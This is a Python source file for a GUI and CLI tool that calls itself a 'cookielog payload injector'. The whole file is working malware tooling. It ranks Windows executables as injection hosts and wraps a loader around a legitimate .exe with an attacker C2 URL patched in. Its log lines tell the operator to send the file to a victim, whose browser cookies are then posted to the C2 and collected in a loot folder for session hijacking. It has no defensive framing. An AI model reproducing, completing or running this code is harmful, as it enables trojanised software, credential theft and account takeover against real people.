# pick.py -- chooses which .exe to infect. Classifies the PE before you click.
#   pick.bat / pythonw pick.py   -> GUI
#   python pick.py --cli         -> no desktop (psexec, ssh)
#   python pick.py --dark         -> force dark mode
#   python pick.py --light        -> force light mode
import json, os, shutil, struct, subprocess, sys, threading, time
import tkinter as tk
from tkinter import filedialog, ttk

HERE = os.path.dirname(os.path.abspath(__file__))
BIN  = os.path.join(HERE, "bin")
LOADER = os.path.join(BIN, "loader.exe")
DLL   = os.path.join(BIN, "ckdll.dll")
SINK   = os.path.join(HERE, "sink.py")
LIST   = os.path.join(HERE, "hosts.json")
LOOT   = os.path.join(HERE, "loot")
os.makedirs(LOOT, exist_ok=True)
JSONF  = os.path.join(LOOT, "cookies_all.json")
TXTF   = os.path.join(LOOT, "cookies_all.txt")
COOKED = os.path.join(HERE, "cooked")
MAGIC  = b"CKLG"

LIFE = {
    "notepad.exe":       ("long", "closes when you close it"),
    "charmap.exe":       ("long", "quiet GUI, only system DLLs"),
    "msinfo32.exe":      ("long", "GUI, no network, no child processes"),
    "fsquirt.exe":       ("long", "stays open waiting for Bluetooth"),
    "explorer.exe":      ("eternal", "killing the host kills the shell"),
    "runtimebroker.exe": ("short", "dies when some UI app disappears"),
    "prevhost.exe":      ("short", "seconds"),
    "taskhost.exe":      ("short", "seconds"),
    "taskhostw.exe":     ("medium", "respawns"),
    "mobsync.exe":       ("short", "exits on its own"),
    "smartscreen.exe":   ("short", "exits on its own"),
}
CURATED = ["notepad.exe", "charmap.exe", "msinfo32.exe", "runtimebroker.exe",
           "prevhost.exe", "mobsync.exe", "smartscreen.exe", "fsquirt.exe"]

# ------------------------------------------------------------------ themes
THEMES = {
    "dark": {
        "bg":       "#1a1a1a",
        "bg2":      "#222222",
        "bg3":      "#2d2d2d",
        "fg":       "#d4d4d4",
        "fg_dim":   "#6a6a6a",
        "accent":   "#4a9eff",
        "ok":       "#5cb85c",
        "warn":     "#f0ad4e",
        "err":      "#d9534f",
        "tree_bg":  "#1e1e1e",
        "tree_fg":  "#d4d4d4",
        "tree_sel": "#264f78",
        "log_bg":   "#0c0c0c",
        "log_fg":   "#b0b0b0",
        "btn_bg":   "#2d2d2d",
        "btn_fg":   "#d4d4d4",
        "btn_act":  "#1a6b1a",
        "tag_bom":     "#5cb85c",
        "tag_oneshot": "#f0ad4e",
        "tag_arrisc":  "#e67e22",
        "tag_evitar":  "#d9534f",
        "tag_incomp":  "#d9534f",
        "tag_fora":    "#6a6a6a",
    },
    "light": {
        "bg":       "#f5f5f5",
        "bg2":      "#ffffff",
        "bg3":      "#e0e0e0",
        "fg":       "#1a1a1a",
        "fg_dim":   "#888888",
        "accent":   "#1976d2",
        "ok":       "#2e7d32",
        "warn":     "#f57f17",
        "err":      "#c62828",
        "tree_bg":  "#ffffff",
        "tree_fg":  "#1a1a1a",
        "tree_sel": "#bbdefb",
        "log_bg":   "#1a1a1a",
        "log_fg":   "#cccccc",
        "btn_bg":   "#e0e0e0",
        "btn_fg":   "#1a1a1a",
        "btn_act":  "#1a6b1a",
        "tag_bom":     "#2e7d32",
        "tag_oneshot": "#e65100",
        "tag_arrisc":  "#e65100",
        "tag_evitar":  "#c62828",
        "tag_incomp":  "#c62828",
        "tag_fora":    "#9e9e9e",
    },
}

def sys32():
    w = os.environ.get("SystemRoot", r"C:\Windows")
    if os.environ.get("PROCESSOR_ARCHITEW6432"):
        nat = os.path.join(w, "Sysnative")
        if os.path.isdir(nat): return nat
    return os.path.join(w, "System32")

def pe(path):
    r = {"path": path, "kind": "nativo", "bits": "?", "gui": "?", "size": 0}
    try:
        r["size"] = os.path.getsize(path)
        with open(path, "rb") as f: head = f.read(1 << 20)
    except OSError:
        r["kind"] = "unreadable"; return r
    if head[:2] != b"MZ" or len(head) < 0x40:
        r["kind"] = "non-PE"; return r
    e = struct.unpack_from("<I", head, 0x3C)[0]
    if head[e:e+4] != b"PE\0\0":
        r["kind"] = "non-PE"; return r
    machine, nsec = struct.unpack_from("<HH", head, e + 4)
    opt = e + 24
    magic = struct.unpack_from("<H", head, opt)[0]
    r["bits"] = {0x8664: "x64", 0x14c: "x86", 0xaa64: "arm64"}.get(machine, "0x%x" % machine)
    r["gui"] = "GUI" if struct.unpack_from("<H", head, opt + 68)[0] == 2 else "CONSOLE"
    dd = opt + (112 if magic == 0x20b else 96)
    if dd + 14*8 + 8 <= len(head) and struct.unpack_from("<I", head, dd + 14*8 + 4)[0]:
        r["kind"] = ".NET"
    sec = opt + struct.unpack_from("<H", head, e + 20)[0]
    secs = []
    for i in range(min(nsec, 96)):
        o = sec + i*40
        if o + 40 > len(head): break
        nm = head[o:o+8].rstrip(b"\0").decode("latin1")
        va, vs, raw, praw = struct.unpack_from("<IIII", head, o + 12)
        secs.append((nm, va, vs, raw, praw))
    if any(n.startswith(("_MEI", ".pyi")) for n, _, _, _, _ in secs) or b"PyInstaller" in head:
        r["kind"] = "Python"
    elif r["kind"] == "nativo" and dd + 16 <= len(head) and struct.unpack_from("<I", head, dd + 8)[0]:
        for i in range(64):
            d = dd + 8 + i*20
            if d + 16 > len(head): break
            nrva = struct.unpack_from("<I", head, d + 12)[0]
            if not nrva: break
            off = None
            for nm, va, vs, raw, praw in secs:
                if va <= nrva < va + max(vs, 0x400):
                    off = praw + (nrva - va); break
            if off and off + 40 < len(head):
                nm = head[off:off+40].split(b"\0")[0].decode("latin1", "replace").lower()
                if nm in ("mscoree.dll", "clr.dll"): r["kind"] = ".NET"
                elif nm.startswith("python"): r["kind"] = "Python"
    return r

def verdict(r):
    if r["kind"] in ("non-PE", "unreadable"): return "out", r["kind"]
    if r["bits"] != "x64": return "incompatible", r["bits"] + " cannot host x64 payload"
    if r["kind"] == ".NET": return "avoid", "CLR + extra threads"
    if r["kind"] == "Python": return "avoid", "bootstrap re-extracts and reopens the process"
    if r["gui"] == "CONSOLE": return "risky", "console flashes and dies fast"
    life, why = LIFE.get(os.path.basename(r["path"]).lower(), ("?", "unknown lifetime"))
    if life == "short": return "one-shot", why
    return "bom", why

def load_list():
    if os.path.exists(LIST):
        try:
            with open(LIST, encoding="utf-8") as f:
                return [p for p in json.load(f) if os.path.exists(p)]
        except Exception: pass
    return []

def save_list():
    with open(LIST, "w", encoding="utf-8") as f: json.dump(ROWS, f, indent=1)

ROWS = load_list()
UI = {"tree": None, "theme": "dark", "root": None, "log": None}

def add(paths):
    tree = UI.get("tree")
    for p in paths:
        p = os.path.abspath(p)
        if not os.path.exists(p) or p in ROWS: continue
        ROWS.append(p)
        if tree is not None:
            r = pe(p); v, why = verdict(r)
            tree.insert("", "end", iid=p, tags=(v,), values=(
                os.path.basename(p) + "  [%d KB]" % (r["size"] // 1024),
                r["bits"], r["kind"], r["gui"], v, why + "  |  " + p))
    save_list()

def sys_hosts():
    return [os.path.join(sys32(), n) for n in CURATED if os.path.exists(os.path.join(sys32(), n))]

# ------------------------------------------------------------------ sink + loader
NEWCONSOLE = 0x00000010
SINK_PROC = {"proc": None}

def count_cookies():
    try:
        with open(JSONF, encoding="utf-8") as f: data = json.load(f)
        doms = set(c.get("domain","?") for c in data)
        return len(data), len(doms)
    except Exception: return 0, 0

def ensure_sink(log):
    p = SINK_PROC["proc"]
    if p and p.poll() is None: return p
    p = subprocess.Popen([sys.executable, SINK], cwd=HERE, creationflags=NEWCONSOLE)
    SINK_PROC["proc"] = p
    log("[*] sink.py pid=%d -- waiting for pipe" % p.pid)
    time.sleep(1.0)
    return p

def run(path, sink, kill, purge, timeout, extra, log=print):
    if not os.path.exists(LOADER):
        log("[-] missing %s (run build.bat)" % LOADER); return
    before, _ = count_cookies()

    def _thread():
        if sink: ensure_sink(log)
        cmd = [LOADER, "-p", path]
        if kill:  cmd.append("--kill")
        if purge: cmd.append("--purge")
        cmd += ["-t", str(int(timeout))]
        if extra.strip(): cmd.append(extra.strip())
        log("[*] loader: " + subprocess.list2cmdline(cmd))
        try:
            lp = subprocess.run(cmd, cwd=BIN, capture_output=True, text=True,
                                timeout=int(timeout)/1000+10)
            for line in (lp.stdout or "").strip().splitlines(): log("  " + line)
            if lp.stderr and lp.stderr.strip():
                for line in lp.stderr.strip().splitlines(): log("[!] " + line)
            log("[*] loader exit=%d" % lp.returncode)
        except subprocess.TimeoutExpired:
            log("[!] loader: timeout after %d ms" % int(timeout))
        except Exception as ex:
            log("[!] loader error: %s" % ex)
        time.sleep(2.0)
        after, doms = count_cookies()
        diff = after - before
        if after:
            log("[+] %d cookies in collection (%+d new) | %d domains" % (after, diff, doms))
            log("    -> %s" % JSONF)
            log("    -> %s" % TXTF)
        else:
            log("[-] no cookies received")
            log("    fallback: C:\\ProgramData\\cookielog\\drop.json")
        if sink and SINK_PROC["proc"] and SINK_PROC["proc"].poll() is None:
            log("[*] sink.py still listening (pid=%d)" % SINK_PROC["proc"].pid)

    threading.Thread(target=_thread, daemon=True).start()

# ------------------------------------------------------------------ builder
C2_SENTINEL = b"CKC2_DEADBEEF_"

def build_infected(host_path, c2_url="", log=print):
    """Infects the .exe: prepends the loader and appends the original host.
    Format: [loader.exe (with C2 URL patched)][host.exe bytes][host_len:4 LE]["CKLG":4]
    Output goes to ifec/<name>.exe (does NOT overwrite the original).
    The C2 URL is embedded in the payload via sentinel patching -- when the victim
    runs it, the payload extracts cookies and sends HTTP POST to the C2.
    If c2_url is empty, the payload uses local fallback (pipe/file)."""
    if not os.path.isfile(LOADER):
        log("[-] missing loader.exe -- rebuild first"); return None
    if not os.path.isfile(host_path):
        log("[-] host does not exist: %s" % host_path); return None
    try:
        with open(LOADER, "rb") as f: loader_bytes = f.read()
        with open(host_path, "rb") as f: host_bytes = f.read()
    except Exception as ex:
        log("[!] error reading files: %s" % ex); return None
    # strip appended data from loader if present (reuse case)
    idx = loader_bytes.rfind(MAGIC)
    if idx != -1 and idx > len(loader_bytes) - 12:
        old_len = struct.unpack_from("<I", loader_bytes, idx - 4)[0]
        loader_bytes = loader_bytes[:idx - 4 - old_len]
        log("[*] loader already had host appended -- removed")
    # if the host was previously infected, extract the original host from within it
    hidx = host_bytes.rfind(MAGIC)
    if hidx != -1 and hidx > len(host_bytes) - 12:
        old_hlen = struct.unpack_from("<I", host_bytes, hidx - 4)[0]
        if old_hlen > 0 and hidx - 4 - old_hlen > 0:
            log("[*] host was already infected -- restoring original")
            real_host = host_bytes[hidx - 4 - old_hlen : hidx - 4]
            host_bytes = real_host
    # Patch C2 URL into the payload embedded in the loader
    if c2_url:
        sidx = loader_bytes.find(C2_SENTINEL)
        if sidx == -1:
            log("[!] C2 sentinel not found in loader -- no HTTP exfiltration")
        else:
            url_bytes = c2_url.encode("utf-8")[:255]
            url_padded = url_bytes + b"\0" * (256 - len(url_bytes))
            loader_bytes = loader_bytes[:sidx] + url_padded + loader_bytes[sidx+256:]
            log("[+] C2 URL embedded: %s" % c2_url)
    out = loader_bytes + host_bytes + struct.pack("<I", len(host_bytes)) + MAGIC
    # output to ifec/
    IFEC = os.path.join(HERE, "ifec")
    os.makedirs(IFEC, exist_ok=True)
    bname = os.path.basename(host_path)
    out_path = os.path.join(IFEC, bname)
    try:
        with open(out_path, "wb") as f: f.write(out)
    except Exception as ex:
        log("[!] failed to write: %s" % ex); return None
    log("[+] .exe infected: ifec\\%s" % bname)
    log("    loader: %d KB + host: %d KB = %d KB" % (
        len(loader_bytes)//1024, len(host_bytes)//1024, len(out)//1024))
    if c2_url:
        log("[*] send ifec\\%s to victim" % bname)
        log("[*] victim runs -> host opens + cookies from VICTIM go to: %s" % c2_url)
    else:
        log("[*] no C2 -- payload uses local fallback (pipe/drop.json)")
    log("[*] format: Cookie-Editor JSON | cookies received in loot/")
    return out_path

# ------------------------------------------------------------------ GUI
def apply_theme(root, theme_name):
    t = THEMES[theme_name]
    UI["theme"] = theme_name
    root.configure(bg=t["bg"])
    style = ttk.Style()
    style.theme_use("clam")
    style.configure(".", background=t["bg"], foreground=t["fg"],
                    font=("Segoe UI", 9))
    style.configure("TFrame", background=t["bg"])
    style.configure("TLabel", background=t["bg"], foreground=t["fg"],
                    font=("Segoe UI", 9))
    style.configure("Dim.TLabel", background=t["bg"], foreground=t["fg_dim"],
                    font=("Segoe UI", 8))
    style.configure("Title.TLabel", background=t["bg"], foreground=t["accent"],
                    font=("Segoe UI", 13, "bold"))
    style.configure("Status.TLabel", background=t["bg"], foreground=t["fg_dim"],
                    font=("Consolas", 8))
    style.configure("TButton", background=t["btn_bg"], foreground=t["btn_fg"],
                    font=("Segoe UI", 9), borderwidth=0, focusthickness=0,
                    padding=(10,4))
    style.map("TButton",
              background=[("active", t["bg3"]), ("pressed", t["bg3"])],
              foreground=[("active", t["fg"])])
    style.configure("Act.TButton", background=t["btn_act"], foreground="#ffffff",
                    font=("Segoe UI", 10, "bold"), padding=(12,8),
                    borderwidth=0, focusthickness=0)
    style.map("Act.TButton",
              background=[("active", "#237a23"), ("pressed", "#1a5a1a")])
    style.configure("Kill.TButton", background="#8a2a2a", foreground="#ffffff",
                    font=("Segoe UI", 9), padding=(10,4),
                    borderwidth=0, focusthickness=0)
    style.map("Kill.TButton",
              background=[("active", "#a03535"), ("pressed", "#6a1f1f")])
    style.configure("Build.TButton", background="#2a4a8a", foreground="#ffffff",
                    font=("Segoe UI", 10, "bold"), padding=(12,8),
                    borderwidth=0, focusthickness=0)
    style.map("Build.TButton",
              background=[("active", "#3a5a9a"), ("pressed", "#1a3a7a")])
    style.configure("TCheckbutton", background=t["bg"], foreground=t["fg"],
                    font=("Segoe UI", 9), focusthickness=0)
    style.map("TCheckbutton", background=[("active", t["bg"])])
    style.configure("TSpinbox", fieldbackground=t["bg2"], foreground=t["fg"],
                    background=t["bg3"], bordercolor=t["bg3"],
                    lightcolor=t["bg3"], darkcolor=t["bg3"],
                    arrowcolor=t["fg"])
    style.configure("TEntry", fieldbackground=t["bg2"], foreground=t["fg"],
                    bordercolor=t["bg3"], lightcolor=t["bg3"],
                    darkcolor=t["bg3"], insertcolor=t["fg"])
    style.configure("Treeview", background=t["tree_bg"], foreground=t["tree_fg"],
                    fieldbackground=t["tree_bg"], borderwidth=0,
                    font=("Segoe UI", 9), rowheight=22)
    style.map("Treeview",
              background=[("selected", t["tree_sel"])],
              foreground=[("selected", "#ffffff" if theme_name=="dark" else "#1a1a1a")])
    style.configure("Treeview.Heading", background=t["bg3"], foreground=t["fg"],
                    font=("Segoe UI", 8, "bold"), borderwidth=0,
                    relief="flat", padding=(4,3))
    style.map("Treeview.Heading", background=[("active", t["bg3"])])
    style.configure("TScrollbar", background=t["bg2"],
                    troughcolor=t["bg2"], bordercolor=t["bg2"],
                    arrowcolor=t["fg_dim"])
    tag_map = {"bom": t["tag_bom"], "one-shot": t["tag_oneshot"],
               "risky": t["tag_arrisc"], "avoid": t["tag_evitar"],
               "incompatible": t["tag_incomp"], "out": t["tag_fora"]}
    tree = UI.get("tree")
    if tree:
        for tag, col in tag_map.items():
            tree.tag_configure(tag, foreground=col)
    log_widget = UI.get("log")
    if log_widget:
        log_widget.configure(bg=t["log_bg"], fg=t["log_fg"],
                             insertbackground=t["fg"],
                             selectbackground=t["bg3"],
                             selectforeground=t["fg"],
                             relief="flat", borderwidth=0)
        log_widget.tag_configure("ok",   foreground=t["ok"])
        log_widget.tag_configure("err",  foreground=t["err"])
        log_widget.tag_configure("warn", foreground=t["warn"])
        log_widget.tag_configure("info", foreground=t["log_fg"])

def gui():
    if "--light" in sys.argv: UI["theme"] = "light"
    elif "--dark" in sys.argv: UI["theme"] = "dark"
    else: UI["theme"] = "dark"

    root = tk.Tk()
    root.title("cookielog")
    root.geometry("1080x680")
    root.minsize(880, 540)
    UI["root"] = root

    apply_theme(root, UI["theme"])

    # ---- header
    hdr = ttk.Frame(root)
    hdr.pack(fill="x", padx=12, pady=(10, 2))
    ttk.Label(hdr, text="cookielog", style="Title.TLabel").pack(side="left")
    ttk.Label(hdr, text="  payload injector", style="Dim.TLabel").pack(side="left", pady=(4,0))

    def toggle_theme():
        nt = "light" if UI["theme"] == "dark" else "dark"
        apply_theme(root, nt)
        btn_theme.configure(text="Dark" if nt == "dark" else "Light")
        _refresh_status()

    btn_theme = ttk.Button(hdr, text="Dark" if UI["theme"] == "dark" else "Light",
                           command=toggle_theme, width=7)
    btn_theme.pack(side="right")

    # ---- status bar
    stbar = ttk.Frame(root)
    stbar.pack(fill="x", padx=12, pady=(0, 4))
    lbl_st1 = ttk.Label(stbar, text="", style="Status.TLabel")
    lbl_st1.pack(side="left", padx=(0, 14))
    lbl_st2 = ttk.Label(stbar, text="", style="Status.TLabel")
    lbl_st2.pack(side="left", padx=(0, 14))
    lbl_st3 = ttk.Label(stbar, text="", style="Status.TLabel")
    lbl_st3.pack(side="left", padx=(0, 14))
    lbl_st4 = ttk.Label(stbar, text="", style="Status.TLabel")
    lbl_st4.pack(side="right")

    def _refresh_status():
        t = THEMES[UI["theme"]]
        hl = os.path.isfile(LOADER)
        hd = os.path.isfile(DLL)
        lbl_st1.configure(text=("[OK] " if hl else "[--] ") + "loader.exe",
                          foreground=t["ok"] if hl else t["err"])
        lbl_st2.configure(text=("[OK] " if hd else "[--] ") + "ckdll.dll",
                          foreground=t["ok"] if hd else t["err"])
        try:
            import ctypes
            adm = bool(ctypes.windll.shell32.IsUserAnAdmin())
            lbl_st3.configure(text=("[OK] " if adm else "[--] ") + "admin",
                              foreground=t["ok"] if adm else t["fg_dim"])
        except Exception:
            lbl_st3.configure(text="[--] admin", foreground=t["fg_dim"])
        lbl_st4.configure(text="python %d-bit" % (sys.maxsize.bit_length()+1))
    _refresh_status()

    # ---- treeview
    tf = ttk.Frame(root)
    tf.pack(fill="both", expand=True, padx=12, pady=(0, 4))
    cols = ("host", "bits", "type", "window", "verdict", "reason")
    tree = ttk.Treeview(tf, columns=cols, show="headings", selectmode="browse")
    for c, w in zip(cols, (340, 48, 76, 62, 88, 270)):
        tree.heading(c, text=c.upper())
        tree.column(c, width=w, anchor="w")
    vsb = ttk.Scrollbar(tf, orient="vertical", command=tree.yview)
    tree.configure(yscrollcommand=vsb.set)
    tree.pack(side="left", fill="both", expand=True)
    vsb.pack(side="right", fill="y")
    UI["tree"] = tree
    apply_theme(root, UI["theme"])

    # ---- action bar
    ab = ttk.Frame(root)
    ab.pack(fill="x", padx=12, pady=(4, 2))
    def do_add():
        f = filedialog.askopenfilename(filetypes=[("executables", "*.exe")])
        if f: add([f])
    def do_scan():
        d = filedialog.askdirectory()
        if d:
            out = []
            for dp, _, fs in os.walk(d):
                for fn in fs:
                    if fn.lower().endswith(".exe"): out.append(os.path.join(dp, fn))
            add(out[:400])
    def do_sys(): add(sys_hosts())
    def do_remove():
        for i in tree.selection():
            tree.delete(i)
            if i in ROWS: ROWS.remove(i)
        save_list()
    def do_clear():
        tree.delete(*tree.get_children()); ROWS.clear(); save_list()
    ttk.Button(ab, text="Add .exe", command=do_add).pack(side="left", padx=(0,4))
    ttk.Button(ab, text="Scan folder", command=do_scan).pack(side="left", padx=(0,4))
    ttk.Button(ab, text="System hosts", command=do_sys).pack(side="left", padx=(0,4))
    ttk.Button(ab, text="Remove", command=do_remove).pack(side="left", padx=(0,4))
    ttk.Button(ab, text="Clear list", command=do_clear).pack(side="left")

    # ---- options
    ob = ttk.Frame(root)
    ob.pack(fill="x", padx=12, pady=(2, 4))
    kill  = tk.BooleanVar(value=True)
    purge = tk.BooleanVar(value=True)
    snk   = tk.BooleanVar(value=True)
    ttk.Checkbutton(ob, text="--kill", variable=kill).pack(side="left", padx=(0,10))
    ttk.Checkbutton(ob, text="--purge", variable=purge).pack(side="left", padx=(0,10))
    ttk.Checkbutton(ob, text="sink.py alongside", variable=snk).pack(side="left", padx=(0,10))
    ttk.Label(ob, text="timeout (ms):").pack(side="left", padx=(6,2))
    tmo = ttk.Spinbox(ob, from_=2000, to=600000, increment=1000, width=8)
    tmo.set("20000"); tmo.pack(side="left", padx=(0,10))
    ttk.Label(ob, text="args:").pack(side="left", padx=(4,2))
    extra = ttk.Entry(ob, width=16)
    extra.insert(0, "--all")
    extra.pack(side="left")

    # ---- C2 exfiltration
    c2f = ttk.Frame(root)
    c2f.pack(fill="x", padx=12, pady=(2, 2))
    ttk.Label(c2f, text="C2 URL:", style="Dim.TLabel").pack(side="left", padx=(0,4))
    # default: attacker's local IP (not 127.0.0.1 -- doesn't work if victim is another machine)
    import socket as _sock
    _local_ip = "127.0.0.1"
    try:
        _s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
        _s.settimeout(1)
        _s.connect(("8.8.8.8", 80))
        _local_ip = _s.getsockname()[0]
        _s.close()
    except Exception:
        try:
            _local_ip = _sock.gethostbyname(_sock.gethostname())
        except Exception:
            pass
    # discard invalid IPs (169.254.x.x = APIPA, 0.0.0.0)
    if _local_ip.startswith("0.") or _local_ip.startswith("169.254."):
        _local_ip = "127.0.0.1"
    c2var = tk.StringVar(value="http://%s:9090/" % _local_ip)
    c2entry = ttk.Entry(c2f, textvariable=c2var, width=40)
    c2entry.pack(side="left", fill="x", expand=True)
    ttk.Label(c2f, text="(attacker IP -- victim posts here)", style="Dim.TLabel").pack(side="left", padx=(6,0))

    # ---- main action buttons (2 columns)
    act2 = ttk.Frame(root)
    act2.pack(fill="x", padx=12, pady=(2, 4))
    btn_go = ttk.Button(act2, text="INFECT SELECTED", style="Act.TButton")
    btn_go.pack(side="left", fill="x", expand=True, padx=(0,4))

    btn_gen = ttk.Button(act2, text="INFECTAR .EXE", style="Build.TButton")
    btn_gen.pack(side="left", fill="x", expand=True, padx=(4,0))

    # ---- log
    lf = ttk.Frame(root)
    lf.pack(fill="both", expand=False, padx=12, pady=(0, 4))
    ttk.Label(lf, text="LOG", style="Dim.TLabel").pack(anchor="w", pady=(0,2))
    log = tk.Text(lf, height=9, font=("Consolas", 9), wrap="word",
                  padx=8, pady=4, undo=False, borderwidth=0,
                  highlightthickness=0)
    log.pack(fill="both", expand=True)
    UI["log"] = log
    apply_theme(root, UI["theme"])

    def L(m):
        s = str(m)
        if s.startswith("[+]"):   tag = "ok"
        elif s.startswith("[-]"): tag = "err"
        elif s.startswith("[!]"): tag = "warn"
        else:                     tag = "info"
        log.insert("end", s + "\n", tag)
        log.see("end")

    # ---- results bar
    rb = ttk.Frame(root)
    rb.pack(fill="x", padx=12, pady=(0, 8))
    def show_json():
        if os.path.exists(JSONF): os.startfile(JSONF)
        else: L("[-] loot/cookies_all.json does not exist")
    def show_txt():
        if os.path.exists(TXTF): os.startfile(TXTF)
        else: L("[-] loot/cookies_all.txt does not exist")
    def open_swap():
        if not os.path.exists(JSONF):
            L("[-] no loot/cookies_all.json -- infect first"); return
        try:
            with open(JSONF, encoding="utf-8") as f: data = json.load(f)
            from collections import Counter
            sites = Counter(".".join(c.get("domain","?").lstrip(".").split(".")[-2:])
                            for c in data if c.get("domain"))
            L("[*] top sites:")
            for dom, n in sites.most_common(12): L("    %5d  %s" % (n, dom))
        except Exception as ex: L("[!] %s" % ex)
        L("[*] run: python swap.py <site> [--session] [--auth] [--keep]")
        swapdir = os.path.join(HERE, "swap")
        if os.path.isdir(swapdir): os.startfile(swapdir)
    def open_folder(): os.startfile(HERE)
    def open_ifec():
        ifec = os.path.join(HERE, "ifec")
        if os.path.isdir(ifec): os.startfile(ifec)
        else: L("[-] ifec/ folder does not exist -- infect a .exe first")
    def open_loot():
        if os.path.isdir(LOOT): os.startfile(LOOT)
        else: L("[-] loot/ folder does not exist")
    def open_drop():
        drop = r"C:\ProgramData\cookielog\drop.json"
        if os.path.exists(drop): os.startfile(drop)
        else: L("[-] no drop.json (payload used C2 HTTP or pipe)")
    def do_build():
        L("[*] rebuilding binaries...")
        r = subprocess.run(["cmd", "/c", os.path.join(HERE, "build.bat")],
                           cwd=HERE, capture_output=True, text=True, timeout=60)
        if r.stdout: L(r.stdout.strip())
        if r.stderr: L("[!] " + r.stderr.strip())
        L("[*] build exit=%d" % r.returncode)
        _refresh_status()
        if os.path.isfile(LOADER): L("[+] loader.exe ok")
        if os.path.isfile(DLL): L("[+] ckdll.dll ok")

    ttk.Button(rb, text="View JSON", command=show_json).pack(side="left", padx=(0,4))
    ttk.Button(rb, text="View TXT", command=show_txt).pack(side="left", padx=(0,4))
    ttk.Button(rb, text="loot/", command=open_loot).pack(side="left", padx=(0,4))
    ttk.Button(rb, text="ifec/", command=open_ifec).pack(side="left", padx=(0,4))
    ttk.Button(rb, text="drop.json", command=open_drop).pack(side="left", padx=(0,4))
    ttk.Button(rb, text="Rebuild", command=do_build).pack(side="left", padx=(0,4))
    ttk.Button(rb, text="Stop sink", style="Kill.TButton",
               command=lambda: _kill_sink(L)).pack(side="right")

    # ---- logic
    def go(ev=None):
        sel = tree.selection()
        if not sel: L("[-] nothing selected"); return
        r = pe(sel[0]); v, why = verdict(r)
        if v in ("incompatible", "out"):
            L("[!] %s: %s -- running anyway" % (v, why))
        try: t = int("".join(ch for ch in tmo.get() if ch.isdigit()) or "20000")
        except Exception: t = 20000
        run(sel[0], snk.get(), kill.get(), purge.get(), t, extra.get(), L)

    def gen(ev=None):
        sel = tree.selection()
        if not sel: L("[-] nothing selected"); return
        r = pe(sel[0]); v, why = verdict(r)
        if v in ("incompatible", "out"):
            L("[!] %s: %s -- infecting anyway" % (v, why))
        L("[*] infecting: %s" % sel[0])
        L("[*] output goes to ifec/")
        c2 = c2var.get().strip()
        if not c2: c2 = ""
        build_infected(sel[0], c2, L)

    btn_go.configure(command=go)
    btn_gen.configure(command=gen)
    tree.bind("<Double-1>", go)

    # ---- init
    L("[*] cookielog payload injector | theme: %s" % UI["theme"])
    L("[*] System32 = %s" % sys32())
    if not os.path.isfile(LOADER) or not os.path.isfile(DLL):
        L("[-] binaries not compiled -- click Rebuild")
    try:
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            L("[*] no admin: elevated target will give ACCESS_DENIED")
    except Exception: pass
    add(ROWS)
    root.mainloop()

def _kill_sink(log):
    p = SINK_PROC["proc"]
    if p and p.poll() is None:
        try: p.terminate(); log("[*] sink.py stopped")
        except Exception: log("[!] error stopping sink")
    else:
        log("[*] sink.py was not running")
    SINK_PROC["proc"] = None

def cli():
    add(sys_hosts())
    for n, p in enumerate(ROWS, 1):
        r = pe(p); v, why = verdict(r)
        print("%3d  %-13s %-5s %-9s %-7s %s" % (n, v, r["bits"], r["kind"], r["gui"], p))
    i = input("\nhost: ").strip()
    if i.isdigit() and 1 <= int(i) <= len(ROWS):
        done = threading.Event()
        def cli_log(m):
            print(m)
            if "still listening" in str(m) or "no cookies" in str(m): done.set()
        run(ROWS[int(i) - 1], True, True, True, "20000", "", cli_log)
        done.wait(timeout=60)

if __name__ == "__main__":
    if "--cli" in sys.argv: cli()
    else:
        try: gui()
        except Exception as ex:
            print("[-] no desktop (%s); run: python pick.py --cli" % ex)
